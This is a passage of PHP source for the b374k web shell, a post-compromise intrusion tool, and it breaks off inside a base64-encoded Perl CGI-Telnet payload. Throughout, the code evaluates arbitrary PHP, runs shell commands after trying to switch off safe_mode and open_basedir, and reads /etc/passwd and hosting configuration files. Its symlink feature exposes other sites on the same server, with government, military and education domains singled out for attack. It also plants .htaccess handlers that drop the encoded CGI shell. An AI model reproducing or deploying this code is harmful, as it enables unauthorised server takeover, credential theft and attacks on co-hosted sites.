 &lt;!-- menu start --&gt; &lt;div id="menu"&gt; &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;"&gt;explore&lt;/a&gt; &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=shell"&gt;shell&lt;/a&gt; &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=php"&gt;eval&lt;/a&gt; &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=mysql"&gt;mysql&lt;/a&gt; &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=phpinfo"&gt;phpinfo&lt;/a&gt; &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=netsploit"&gt;netsploit&lt;/a&gt; &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=upload"&gt;upload&lt;/a&gt; &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=jumping"&gt;jumping&lt;/a&gt; &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=symlink"&gt;symlink&lt;/a&gt;
 
  &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=domain"&gt;domain&lt;/a&gt;
  &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=bypass"&gt;bypass&lt;/a&gt;
  &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=logout"&gt;logout&lt;/a&gt; &lt;/div&gt; 
  
  
  &lt;!-- menu end --&gt;
  &lt;!-- menu2 start --&gt; 
  
  &lt;div id="menu"&gt;&lt;a onClick="window.open('http://networktools.nl/reverseip/actionhandler&toolAction=toolReverseIP&toolInput=&lt;?php echo $_SERVER['SERVER_ADDR']; ?&gt;','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://networktools.nl/reverseip/actionhandler&toolAction=toolReverseIP&toolInput=&lt;?php echo $_SERVER['SERVER_ADDR']; ?&gt;"&gt;Site list&lt;/a&gt;
   &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=python"&gt;python&lt;/a&gt;
   &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=cgi"&gt;Cgi Shell&lt;/a&gt;
   &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=cgi2012"&gt;CGI-Telnet 2012&lt;/a&gt;
   &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=phpini"&gt;Safe Mode&lt;/a&gt;
   
   &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=config"&gt;Config Sh3ll&lt;/a&gt;
     &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=wp"&gt;Wordpress&lt;/a&gt;
	 &lt;a href="?&lt;?php echo "y=" . $pwd; ?&gt;&x=joomla"&gt;Joomla&lt;/a&gt;
   &lt;/div&gt; &lt;!-- menu2 end --&gt;



 &lt;?php if (isset($_GET['x']) && ($_GET['x'] == 'php')) { ?&gt; &lt;form action="?y=&lt;?php echo $pwd; ?&gt;&x=php" method="post"&gt; &lt;table class="cmdbox"&gt; &lt;tr&gt;&lt;td&gt; &lt;textarea class="output" name="cmd" id="cmd"&gt; &lt;?php if (isset($_POST['submitcmd'])) {
        echo eval(magicboom($_POST['cmd']));
    } else echo "echo file_get_contents('/etc/passwd');"; ?&gt; &lt;/textarea&gt; &lt;tr&gt;&lt;td&gt;&lt;input style="width:6%;margin:0px;" class="inputzbut" type="submit" value="Go !" name="submitcmd" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/form&gt; &lt;?php
} elseif (isset($_GET['x']) && ($_GET['x'] == 'mysql')) {
    if (isset($_GET['sqlhost']) && isset($_GET['sqluser']) && isset($_GET['sqlpass']) && isset($_GET['sqlport'])) {
        $sqlhost = $_GET['sqlhost'];
        $sqluser = $_GET['sqluser'];
        $sqlpass = $_GET['sqlpass'];
        $sqlport = $_GET['sqlport'];
        if ($con = @mysql_connect($sqlhost . ":" . $sqlport, $sqluser, $sqlpass)) {
            $msg.= "&lt;div style=\"width:99%;padding:4px 10px 0 10px;\"&gt;";
            $msg.= "&lt;p&gt;Connected to " . $sqluser . "&lt;span class=\"gaya\"&gt;@&lt;/span&gt;" . $sqlhost . ":" . $sqlport;
            $msg.= "&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;-&gt;&lt;/span&gt;&nbsp;&nbsp;&lt;a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;\"&gt;[ databases ]&lt;/a&gt;";
            if (isset($_GET['db'])) $msg.= "&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;-&gt;&lt;/span&gt;&nbsp;&nbsp;&lt;a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $_GET['db'] . "\"&gt;" . htmlspecialchars($_GET['db']) . "&lt;/a&gt;";
            if (isset($_GET['table'])) $msg.= "&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;-&gt;&lt;/span&gt;&nbsp;&nbsp;&lt;a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $_GET['db'] . "&amp;table=" . $_GET['table'] . "\"&gt;" . htmlspecialchars($_GET['table']) . "&lt;/a&gt;";
            $msg.= "&lt;/p&gt;&lt;p&gt;version : " . mysql_get_server_info($con) . " proto " . mysql_get_proto_info($con) . "&lt;/p&gt;";
            $msg.= "&lt;/div&gt;";
            echo $msg;
            if (isset($_GET['db']) && (!isset($_GET['table'])) && (!isset($_GET['sqlquery']))) {
                $db = $_GET['db'];
                $query = "DROP TABLE IF EXISTS b374k_table;
CREATE TABLE `b374k_table` ( `file` LONGBLOB NOT NULL );
LOAD DATA INFILE \"/etc/passwd\"
INTO TABLE b374k_table;SELECT * FROM b374k_table;
DROP TABLE IF EXISTS b374k_table;";
                $msg = "&lt;div style=\"width:99%;padding:0 10px;\"&gt;&lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input type=\"hidden\" name=\"x\" value=\"mysql\" /&gt; &lt;input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /&gt; &lt;input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /&gt; &lt;input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /&gt; &lt;p&gt;&lt;textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\"&gt;$query&lt;/textarea&gt;&lt;/p&gt; &lt;p&gt;&lt;input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt; ";
                $tables = array();
                $msg.= "&lt;table class=\"explore\" style=\"width:99%;\"&gt;&lt;tr&gt;&lt;th&gt;available tables on " . $db . "&lt;/th&gt;&lt;/tr&gt;";
                $hasil = @mysql_list_tables($db, $con);
                while (list($table) = @mysql_fetch_row($hasil)) {
                    @array_push($tables, $table);
                }
                @sort($tables);
                foreach ($tables as $table) {
                    $msg.= "&lt;tr&gt;&lt;td&gt;&lt;a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $db . "&amp;table=" . $table . "\"&gt;$table&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;";
                }
                $msg.= "&lt;/table&gt;";
            } elseif (isset($_GET['table']) && (!isset($_GET['sqlquery']))) {
                $db = $_GET['db'];
                $table = $_GET['table'];
                $query = "SELECT * FROM " . $db . "." . $table . " LIMIT 0,100;";
                $msgq = "&lt;div style=\"width:99%;padding:0 10px;\"&gt;&lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input type=\"hidden\" name=\"x\" value=\"mysql\" /&gt; &lt;input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /&gt; &lt;input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /&gt; &lt;input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /&gt; &lt;input type=\"hidden\" name=\"table\" value=\"" . $table . "\" /&gt; &lt;p&gt;&lt;textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\"&gt;" . $query . "&lt;/textarea&gt;&lt;/p&gt; &lt;p&gt;&lt;input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt; ";
                $columns = array();
                $msg = "&lt;table class=\"explore\" style=\"width:99%;\"&gt;";
                $hasil = @mysql_query("SHOW FIELDS FROM " . $db . "." . $table);
                while (list($column) = @mysql_fetch_row($hasil)) {
                    $msg.= "&lt;th&gt;$column&lt;/th&gt;";
                    $kolum = $column;
                }
                $msg.= "&lt;/tr&gt;";
                $hasil = @mysql_query("SELECT count(*) FROM " . $db . "." . $table);
                list($total) = mysql_fetch_row($hasil);
                if (isset($_GET['z'])) $page = (int)$_GET['z'];
                else $page = 1;
                $pagenum = 100;
                $totpage = ceil($total / $pagenum);
                $start = (($page - 1) * $pagenum);
                $hasil = @mysql_query("SELECT * FROM " . $db . "." . $table . " LIMIT " . $start . "," . $pagenum);
                while ($datas = @mysql_fetch_assoc($hasil)) {
                    $msg.= "&lt;tr&gt;";
                    foreach ($datas as $data) {
                        if (trim($data) == "") $data = "&nbsp;";
                        $msg.= "&lt;td&gt;$data&lt;/td&gt;";
                    }
                    $msg.= "&lt;/tr&gt;";
                }
                $msg.= "&lt;/table&gt;";
                $head = "&lt;div style=\"padding:10px 0 0 6px;\"&gt; &lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input type=\"hidden\" name=\"x\" value=\"mysql\" /&gt; &lt;input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /&gt; &lt;input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /&gt; &lt;input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /&gt; &lt;input type=\"hidden\" name=\"table\" value=\"" . $table . "\" /&gt; Page &lt;select class=\"inputz\" name=\"z\" onchange=\"this.form.submit();\"&gt;";
                for ($i = 1;$i &lt;= $totpage;$i++) {
                    $head.= "&lt;option value=\"" . $i . "\"&gt;" . $i . "&lt;/option&gt;";
                    if ($i == $_GET['z']) $head.= "&lt;option value=\"" . $i . "\" selected=\"selected\"&gt;" . $i . "&lt;/option&gt;";
                }
                $head.= "&lt;/select&gt;&lt;noscript&gt;&lt;input class=\"inputzbut\" type=\"submit\" value=\"Go !\" /&gt;&lt;/noscript&gt;&lt;/form&gt;&lt;/div&gt;";
                $msg = $msgq . $head . $msg;
            } elseif (isset($_GET['submitquery']) && ($_GET['sqlquery'] != "")) {
                $db = $_GET['db'];
                $query = magicboom($_GET['sqlquery']);
                $msg = "&lt;div style=\"width:99%;padding:0 10px;\"&gt;&lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input type=\"hidden\" name=\"x\" value=\"mysql\" /&gt; &lt;input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /&gt; &lt;input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /&gt; &lt;input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /&gt; &lt;p&gt;&lt;textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\"&gt;" . $query . "&lt;/textarea&gt;&lt;/p&gt; &lt;p&gt;&lt;input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt; ";
                @mysql_select_db($db);
                $querys = explode(";", $query);
                foreach ($querys as $query) {
                    if (trim($query) != "") {
                        $hasil = mysql_query($query);
                        if ($hasil) {
                            $msg.= "&lt;p style=\"padding:0;margin:20px 6px 0 6px;\"&gt;" . $query . ";&nbsp;&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;[&lt;/span&gt; ok &lt;span class=\"gaya\"&gt;]&lt;/span&gt;&lt;/p&gt;";
                            $msg.= "&lt;table class=\"explore\" style=\"width:99%;\"&gt;&lt;tr&gt;";
                            for ($i = 0;$i &lt; @mysql_num_fields($hasil);$i++) $msg.= "&lt;th&gt;" . htmlspecialchars(@mysql_field_name($hasil, $i)) . "&lt;/th&gt;";
                            $msg.= "&lt;/tr&gt;";
                            for ($i = 0;$i &lt; @mysql_num_rows($hasil);$i++) {
                                $rows = @mysql_fetch_array($hasil);
                                $msg.= "&lt;tr&gt;";
                                for ($j = 0;$j &lt; @mysql_num_fields($hasil);$j++) {
                                    if ($rows[$j] == "") $dataz = "&nbsp;";
                                    else $dataz = $rows[$j];
                                    $msg.= "&lt;td&gt;" . $dataz . "&lt;/td&gt;";
                                }
                                $msg.= "&lt;/tr&gt;";
                            }
                            $msg.= "&lt;/table&gt;";
                        } else $msg.= "&lt;p style=\"padding:0;margin:20px 6px 0 6px;\"&gt;" . $query . ";&nbsp;&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;[&lt;/span&gt; error &lt;span class=\"gaya\"&gt;]&lt;/span&gt;&lt;/p&gt;";
                    }
                }
            } else {
                $query = "SHOW PROCESSLIST;
SHOW VARIABLES;
SHOW STATUS;";
                $msg = "&lt;div style=\"width:99%;padding:0 10px;\"&gt;&lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input type=\"hidden\" name=\"x\" value=\"mysql\" /&gt; &lt;input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /&gt; &lt;input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /&gt; &lt;input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /&gt; &lt;p&gt;&lt;textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\"&gt;" . $query . "&lt;/textarea&gt;&lt;/p&gt; &lt;p&gt;&lt;input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt; ";
                $dbs = array();
                $msg.= "&lt;table class=\"explore\" style=\"width:99%;\"&gt;&lt;tr&gt;&lt;th&gt;available databases&lt;/th&gt;&lt;/tr&gt;";
                $hasil = @mysql_list_dbs($con);
                while (list($db) = @mysql_fetch_row($hasil)) {
                    @array_push($dbs, $db);
                }
                @sort($dbs);
                foreach ($dbs as $db) {
                    $msg.= "&lt;tr&gt;&lt;td&gt;&lt;a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $db . "\"&gt;$db&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;";
                }
                $msg.= "&lt;/table&gt;";
            }
            @mysql_close($con);
        } else $msg = "&lt;p style=\"text-align:center;\"&gt;cant connect to mysql server&lt;/p&gt;";
        echo $msg;
    } else { ?&gt; &lt;form action="?" method="get"&gt; &lt;input type="hidden" name="y" value="&lt;?php echo $pwd; ?&gt;" /&gt; &lt;input type="hidden" name="x" value="mysql" /&gt; &lt;table class="tabnet" style="width:300px;"&gt; &lt;tr&gt;&lt;th colspan="2"&gt;Connect to mySQL server&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Host&lt;/td&gt;&lt;td&gt;&lt;input style="width:220px;" class="inputz" type="text" name="sqlhost" value="localhost" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Username&lt;/td&gt;&lt;td&gt;&lt;input style="width:220px;" class="inputz" type="text" name="sqluser" value="root" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Password&lt;/td&gt;&lt;td&gt;&lt;input style="width:220px;" class="inputz" type="text" name="sqlpass" value="password" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&nbsp;&nbsp;Port&lt;/td&gt;&lt;td&gt;&lt;input style="width:80px;" class="inputz" type="text" name="sqlport" value="3306" /&gt;&nbsp;&lt;input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitsql" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; &lt;?php
    }
} elseif (isset($_GET['x']) && ($_GET['x'] == 'phpinfo')) {
    @ob_start();
    eval("phpinfo();");
    $buff = @ob_get_contents();
    @ob_end_clean();
    $awal = strpos($buff, "&lt;body&gt;") + 6;
    $akhir = strpos($buff, "&lt;/body&gt;");
    echo "&lt;div class=\"phpinfo\"&gt;" . substr($buff, $awal, $akhir - $awal) . "&lt;/div&gt;";
} elseif (isset($_GET['x']) && ($_GET['x'] == 'logout')) {
    @session_start();
    @session_unregister("login");
    echo "&lt;meta http-equiv='refresh' content='0; url=?y=" . $pwd . "' /&gt;";
    "&lt;/div&gt;";
} elseif (isset($_GET['x']) && ($_GET['x'] == 'symlink')) {
?&gt;
&lt;form action="?y=&lt;?php echo $pwd; ?&gt;&amp;x=symlink" method="post"&gt;

&lt;?php
    @set_time_limit(0);
    echo "&lt;center&gt;";
    @mkdir('sym', 0777);
    $htaccess = "Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any";
    $write = @fopen('sym/.htaccess', 'w');
    fwrite($write, $htaccess);
    @symlink('/', 'sym/root');
    $filelocation = basename(__FILE__);
    $read_named_conf = @file('/etc/named.conf');
    if (!$read_named_conf) {
        echo "&lt;pre class=ml1 style='margin-top:5px'&gt;# Cant access this file on server -&gt; [ /etc/named.conf ]&lt;/pre&gt;&lt;/center&gt;";
    } else {
        echo "&lt;br&gt;&lt;br&gt;&lt;div class='tmp'&gt;&lt;table border='1' bordercolor='#FF0000' width='400' cellpadding='1' cellspacing='0'&gt;&lt;td&gt;Domains&lt;/td&gt;&lt;td&gt;Users&lt;/td&gt;&lt;td&gt;symlink &lt;/td&gt;";
        foreach ($read_named_conf as $subject) {
            if (eregi('zone', $subject)) {
                preg_match_all('#zone "(.*)"#', $subject, $string);
                flush();
                if (strlen(trim($string[1][0])) &gt; 2) {
                    $UID = posix_getpwuid(@fileowner('/etc/valiases/' . $string[1][0]));
                    $name = $UID['name'];
                    @symlink('/', 'sym/root');
                    $name = $string[1][0];
                    $iran = '\.ir';
                    $israel = '\.il';
                    $indo = '\.id';
                    $sg12 = '\.sg';
                    $edu = '\.edu';
                    $gov = '\.gov';
                    $gose = '\.go';
                    $gober = '\.gob';
                    $mil1 = '\.mil';
                    $mil2 = '\.mi';
                    if (eregi("$iran", $string[1][0]) or eregi("$israel", $string[1][0]) or eregi("$indo", $string[1][0]) or eregi("$sg12", $string[1][0]) or eregi("$edu", $string[1][0]) or eregi("$gov", $string[1][0]) or eregi("$gose", $string[1][0]) or eregi("$gober", $string[1][0]) or eregi("$mil1", $string[1][0]) or eregi("$mil2", $string[1][0])) {
                        $name = "&lt;div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '&gt;" . $string[1][0] . '&lt;/div&gt;';
                    }
                    echo "
&lt;tr&gt;

&lt;td&gt;
&lt;div class='dom'&gt;&lt;a target='_blank' href=http://www." . $string[1][0] . '/&gt;' . $name . ' &lt;/a&gt; &lt;/div&gt;
&lt;/td&gt;

&lt;td&gt;
' . $UID['name'] . "
&lt;/td&gt;

&lt;td&gt;
&lt;a href='sym/root/home/" . $UID['name'] . "/public_html' target='_blank'&gt;Symlink &lt;/a&gt;
&lt;/td&gt;

&lt;/tr&gt;&lt;/div&gt; ";
                    flush();
                }
            }
        }
    }
    echo "&lt;/center&gt;&lt;/table&gt;";
    "&lt;/div&gt;";
} elseif (isset($_GET['x']) && ($_GET['x'] == 'bypass')) {
    echo "&lt;center/&gt;&lt;br/&gt;&lt;b&gt;&lt;font color=blue&gt;b374k  Private Safe Mode Command  Bypass Exploit&lt;/font&gt;&lt;/b&gt;&lt;br&gt;
";
    print_r('
&lt;pre&gt;
&lt;form method="POST" action=""&gt;
&lt;b&gt;&lt;font color=blue&gt;&lt;b&gt;&lt;font color="blue"&gt;Command  :=) &lt;/font&gt;&lt;/font&gt;&lt;/b&gt;&lt;input name="baba" type="text" class="inputz" size="34"&gt;&lt;input type="submit" class="inputzbut" value="Go"&gt;
&lt;/form&gt;
&lt;form method="POST" action=""&gt;&lt;strong&gt;&lt;b&gt;&lt;font color="blue"&gt;Menu Bypass  :=)  &lt;/font&gt;&lt;/strong&gt;&lt;select name="liz0" size="1" class="inputz"&gt;
&lt;option value="cat /etc/passwd"&gt;/etc/passwd&lt;/option&gt;
&lt;option value="netstat -an | grep -i listen"&gt;netstat&lt;/option&gt;
&lt;option value="cat /var/cpanel/accounting.log"&gt;/var/cpanel/accounting.log&lt;/option&gt;
&lt;option value="cat /etc/syslog.conf"&gt;/etc/syslog.conf&lt;/option&gt;
&lt;option value="cat /etc/hosts"&gt;/etc/hosts&lt;/option&gt;
&lt;option value="cat /etc/named.conf"&gt;/etc/named.conf&lt;/option&gt;
&lt;option value="cat /etc/httpd/conf/httpd.conf"&gt;/etc/httpd/conf/httpd.conf&lt;/option&gt;
&lt;/select&gt; &lt;input type="submit" class="inputzbut" value="G&ouml;"&gt;
&lt;/form&gt;
&lt;/pre&gt;
');
    ini_restore("safe_mode");
    ini_restore("open_basedir");
    $liz0 = shell_exec($_POST[baba]);
    $liz0zim = shell_exec($_POST[liz0]);
    $uid = shell_exec('id');
    $server = shell_exec('uname -a');
    echo "&lt;pre&gt;&lt;h4&gt;";
    echo $liz0;
    echo $liz0zim;
    echo "&lt;/h4&gt;&lt;/pre&gt;";
    "&lt;/div&gt;";
} elseif (isset($_GET['x']) && ($_GET['x'] == 'cgi2012')) {
    echo "&lt;center/&gt;&lt;br/&gt;&lt;b&gt;
 +--==[ CGI-Telnet Version 1.3 ]==--+ 
 &lt;/b&gt;&lt;br&gt;&lt;br&gt;";
    mkdir('cgi2012', 0755);
    chdir('cgi2012');
    $kokdosya = ".htaccess";
    $dosya_adi = "$kokdosya";
    $dosya = fopen($dosya_adi, 'w') or die("Dosya a&#231;&#305;lamad&#305;!");
    $metin = "AddHandler cgi-script .izo";
    fwrite($dosya, $metin);
    fclose($dosya);
    $cgi2012 = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluCnVzZSBNSU1FOjpCYXNlNjQ7CiRWZXJzaW9uPSAiQ0dJLVRlbG5ldCBWZXJzaW9uIDEuMyI7CiRFZGl0UGVyc2lvbj0iPGZvbnQgc3R5bGU9J3RleHQtc2hhZG93OiAwcHggMHB4IDZweCByZ2IoMjU1LCAwLCAwKSwgMHB4IDBweCA1cHggcmdiKDMwMCwgMCwgMCksIDBweCAwcHggNXB4IHJnYigzMDAsIDAsIDApOyBjb2xvcjojZmZmZmZmOyBmb250LXdlaWdodDpib2xkOyc+YjM3NGsgLSBDR0ktVGVsbmV0PC9mb250PiI7CgokUGFzc3dvcmQgPSAiYmFuZHVuZ2tvdGFzYW1wYWgiOwkJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcwoJCQkJIyB0byBsb2dpbi4Kc3ViIElzX1dpbigpewoJJG9zID0gJnRyaW0oJEVOVnsiU0VSVkVSX1NPRlRXQVJFIn0pOwoJaWYoJG9zID1+IG0vd2luL2kpewoJCXJldHVybiAxOwoJfQoJZWxzZXsKCQlyZXR1cm4gMDsKCX0KfQokV2luTlQgPSAmSXNfV2luKCk7CQkJCSMgWW91IG5lZWQgdG8gY2hhbmdlIHRoZSB2YWx1ZSBvZiB0aGlzIHRvIDEgaWYKCQkJCQkJCQkjIHlvdSdyZSBydW5uaW5nIHRoaXMgc2NyaXB0IG9uIGEgV2luZG93cyBOVAoJCQkJCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91CgkJCQkJCQkJIyBjYW4gbGVhdmUgdGhlIHZhbHVlIGFzIGl0IGlzLgoKJE5UQ21kU2VwID0gIiYiOwkJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJCQkJCSMgaW4gYSBjb21tYW5kIGxpbmUgb24gV2luZG93cyBOVC4KCiRVbml4Q21kU2VwID0gIjsiOwkJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJCQkJCSMgaW4gYSBjb21tYW5kIGxpbmUgb24gVW5peC4KCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTAwMDA7CSMgVGltZSBpbiBzZWNvbmRzIGFmdGVyIGNvbW1hbmRzIHdpbGwgYmUga2lsbGVkCgkJCQkJCQkJIyBEb24ndCBzZXQgdGhpcyB0byBhIHZlcnkgbGFyZ2UgdmFsdWUuIFRoaXMgaXMKCQkJCQkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0CgkJCQkJCQkJIyB0YWtlIHZlcnkgbG9uZyB0byBleGVjdXRlLCBsaWtlICJmaW5kIC8iLgoJCQkJCQkJCSMgVGhpcyBpcyB2YWxpZCBvbmx5IG9uIFVuaXggc2VydmVycy4gSXQgaXMKCQkJCQkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4KCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkJIyBJZiB0aGlzIGlzIDEsIHRoZW4gZGF0YSBpcyBzZW50IHRvIHRoZQoJCQkJCQkJCSMgYnJvd3NlciBhcyBzb29uIGFzIGl0IGlzIG91dHB1dCwgb3RoZXJ3aXNlCgkJCQkJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kCgkJCQkJCQkJIyBjb21wbGV0ZXMuIFRoaXMgaXMgdXNlZnVsIGZvciBjb21tYW5kcyBsaWtlCgkJCQkJCQkJIyBwaW5nLCBzbyB0aGF0IHlvdSBjYW4gc2VlIHRoZSBvdXRwdXQgYXMgaXQKCQkJCQkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4KCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISEKCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOwokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7CiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOwokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOwokY29scz0gMTUwOwokcm93cz0gMjY7CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBSZWFkcyB0aGUgaW5wdXQgc2VudCBieSB0aGUgYnJvd3NlciBhbmQgcGFyc2VzIHRoZSBpbnB1dCB2YXJpYWJsZXMuIEl0CiMgcGFyc2VzIEdFVCwgUE9TVCBhbmQgbXVsdGlwYXJ0L2Zvcm0tZGF0YSB0aGF0IGlzIHVzZWQgZm9yIHVwbG9hZGluZyBmaWxlcy4KIyBUaGUgZmlsZW5hbWUgaXMgc3RvcmVkIGluICRpbnsnZid9IGFuZCB0aGUgZGF0YSBpcyBzdG9yZWQgaW4gJGlueydmaWxlZGF0YSd9LgojIE90aGVyIHZhcmlhYmxlcyBjYW4gYmUgYWNjZXNzZWQgdXNpbmcgJGlueyd2YXInfSwgd2hlcmUgdmFyIGlzIHRoZSBuYW1lIG9mCiMgdGhlIHZhcmlhYmxlLiBOb3RlOiBNb3N0I